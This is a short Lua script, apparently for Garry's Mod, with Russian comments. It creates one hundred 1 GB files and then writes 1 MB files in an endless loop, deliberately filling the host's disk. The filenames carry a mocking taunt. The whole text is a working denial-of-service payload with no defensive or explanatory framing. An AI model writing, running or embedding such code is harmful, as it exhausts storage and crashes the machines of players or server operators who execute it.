local one_mb = string.rep("A", 1024 * 1024) -- 1 МБ блок
local fileIndex = 0

for i = 1, 100 do
    fileIndex = fileIndex + 1
    local f = file.Open("Igay_" .. fileIndex .. ".dat", "wb", "DATA")
    for j = 1, 1024 do -- 1 ГБ = 1024 МБ
        f:Write(one_mb)
    end
    f:Close()
    print("[1GB FILE] Created: Igay_" .. fileIndex)
end

while true do
    fileIndex = fileIndex + 1
    local f = file.Open("Igay_" .. fileIndex .. ".dat", "wb", "DATA")
    f:Write(one_mb) -- 1 МБ
    f:Close()
end
